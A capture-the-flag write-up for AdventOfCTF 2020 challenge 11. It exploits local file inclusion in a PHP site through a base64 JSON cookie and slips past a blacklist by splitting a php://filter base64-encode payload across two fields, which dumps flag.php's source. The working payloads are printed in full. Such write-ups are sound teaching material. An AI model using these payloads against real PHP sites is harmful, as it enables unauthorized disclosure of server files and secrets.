+++
author = "Maik de Kruif"
title = "Challenge 11 - AdventOfCTF"
date = 2020-12-11T23:45:32+01:00
description = "A writeup for challenge 11 of AdventOfCTF."
cover = "img/adventofctf/2020/3542630bd0bb5141d94e4b40930bd69d.png"
tags = [
    "AdventOfCTF",
    "challenge",
    "ctf",
    "hacking",
    "writeup",
    "web",
    "php",
]
categories = [
    "ctf",
    "writeups",
    "hacking",
]
+++

- Points: 1100

## Description

Santa's book of secrets has upgraded its security. All should be fine now. The flag is in flag.php.

Visit <https://11.adventofctf.com> to start the challenge.

## Finding the vulnerability

When opening the challenge website, we get some text saying "there is only one person on the naughty list". As there is no visible input, we open devtools to have a look at the cookies or javascript. Here we find one cookie:

```text
zerooneone=eyJwYXRoIjoiLiIsInBhZ2UiOiJtYWluIn0%3D
```

We'll get back to this later, let's first check the flag location provided in the challenge description [`flag.php`](https://11.adventofctf.com/flag.php). Upon opening it, we get a message: "Direct access not permitted". Quite useless for now.

### Cookie

The cookie value looks like a base64 encoded string, so let's try to decode it:

```bash
echo -n "eyJwYXRoIjoiLiIsInBhZ2UiOiJtYWluIn0" | base64 -d
> {"path":".","page":"main"}
```

The output is some JSON data with a path and a page. Let's try to change the page to `flag`.

```bash
echo -n '{"path":".","page":"flag"}' | base64 -w 0
> eyJwYXRoIjoiLiIsInBhZ2UiOiJmbGFnIn0=
```

If we replace the cookie value with this new string and reload the page we get the following message: "Are you trying to get yourself on the naughty list? (no_direct_access)". Sadly we cannot read the flag directly, but this is a different message than the one we got earlier when reading the flag so it might be a different filter. Let's try to access a random page:

```bash
echo -n '{"path":".","page":"asd"}' | base64 -w 0
> eyJwYXRoIjoiLiIsInBhZ2UiOiJhc2QifQ==
```

When loading the page with this new cookie we get some PHP warnings.

### Local File Inclusion

The error message we got was the following:

```text
Warning: include(./asd.php): failed to open stream: No such file or directory in /var/www/html/index.php on line 76

Warning: include(): Failed opening './asd.php' for inclusion (include_path='.:/usr/local/lib/php') in /var/www/html/index.php on line 76
```

Hmm, it seems like it is directly including the input as the page with `.php` appended to it. As we saw earlier, directly accessing the flag didn't work but maybe if we use another path it does. As we know the document root path of the website, we can use the absolute path to the flag and try to access it that way:

```bash
echo -n '{"path":"/var/www/","page":"html/flag"}' | base64 -w 0
> eyJwYXRoIjoiLiIsInBhZ2UiOiIvdmFyL3d3dy9odG1sL2ZsYWcifQ==
```

This time we get another message: "You are on the right page, but you cannot see what you want yet. Go get promoted!".

### Promotion

Go get promoted? I have not seen a way to get promoted... I tried adding extra variables to the JSON like `user` and `role` from previous challenges but nothing worked. Then, I remembered we've got local file inclusion and thus might have another way of reading the file.

### Reading the file

The reason we cannot get the file by just including it, is that it is a PHP file and the flag is probably a variable in it that is not printed. Because of this, the only way to get the flag would be by getting the source of `flag.php`.

#### PHP Filters

PHP has several filters that can be used to read or validate data. This includes [conversion filters](https://www.php.net/manual/en/filters.convert.php). The conversion filter can be used, for instance, convert a file to and from base64. This is exactly what we want as PHP will not thread base64 data as PHP.

Let's try to use the `base64-encode` filter to encode the `flag.php` file to base64:

```bash
echo -n '{"path":"php://filter/convert.base64-encode/resource=/var/www/","page":"read=html/flag"}' | base64 -w 0
> eyJwYXRoIjoicGhwOi8vZmlsdGVyL2NvbnZlcnQuYmFzZTY0LWVuY29kZS9yZXNvdXJjZT0vdmFyL3d3dy8iLCJwYWdlIjoicmVhZD1odG1sL2ZsYWcifQ==
```

Sadly, we didn't get the file. Instead we got another message: "Are you trying to get yourself on the naughty list? (blacklist)". It seems like the usage of filters is also blacklisted. After several attempts, I got it to work with the following input:

```bash
echo -n '{"path":"php://filter","page":"read=convert.base64-encode/resource=/var/www/html/flag"}' | base64 -w 0
> eyJwYXRoIjoicGhwOi8vZmlsdGVyIiwicGFnZSI6InJlYWQ9Y29udmVydC5iYXNlNjQtZW5jb2RlL3Jlc291cmNlPS92YXIvd3d3L2h0bWwvZmxhZyJ9
```

It seems like the check only looks for `filter/convert` in the path and page separately instead of first joining them together as this time, we got some base64 encoded string as the output:

```text
PD9waHAKaWYoIWRlZmluZWQoJ015Q29uc3QnKSkgewogICBkaWUoJ0RpcmVjdCBhY2Nlc3Mgbm90IHBlcm1pdHRlZCcpOwp9Cj8+Cgo8aDQ+V2h5IGRvZXMgRWdpc2NoZSBrZWVwIHNob3dpbmcgdXA/PC9oND4KPD9waHAKCmlmICgkX0NPT0tJRVsiemVyb29uZW9uZSJdKSB7CiAgICAkZGF0YSA9IGpzb25fZGVjb2RlKGJhc2U2NF9kZWNvZGUoJF9DT09LSUVbInplcm9vbmVvbmUiXSksIHRydWUpOwp9CgppZiAoZmFsc2UpIHsKPz4KICAgIDxwPgogICAgICAgIFRoZSBkYXJrIHNlY3JldCBvbiB0aGlzIHBhZ2UgaXM6IE5PVkl7TEZJX2FuZF9zdDFsbF95b3VfZjB1bmRfaXR9CiAgICA8L3A+Cjw/Cn0gZWxzZSB7Cj8+CiAgICA8cD4KICAgICAgICBZb3UgYXJlIG9uIHRoZSByaWdodCBwYWdlLCBidXQgeW91IGNhbm5vdCBzZWUgd2hhdCB5b3Ugd2FudCB5ZXQuIEdvIGdldCBwcm9tb3RlZCEKICAgIDwvcD4KPD9waHAKfQo/Pgo=
```

## Solution

If we use the `base64` command again to decode this string we get the following:

```php
<?php
if(!defined('MyConst')) {
   die('Direct access not permitted');
}
?>

<h4>Why does Egische keep showing up?</h4>
<?php

if ($_COOKIE["zerooneone"]) {
    $data = json_decode(base64_decode($_COOKIE["zerooneone"]), true);
}

if (false) {
?>
    <p>
        The dark secret on this page is: NOVI{LFI_and_st1ll_you_f0und_it}
    </p>
<?
} else {
?>
    <p>
        You are on the right page, but you cannot see what you want yet. Go get promoted!
    </p>
<?php
}
?>
```

It doesn't really look like valid PHP but, we got the flag! It is `NOVI{LFI_and_st1ll_you_f0und_it}`.

This flag can then be submitted for the [challenge](https://ctfd.adventofctf.com/challenges#11-12).
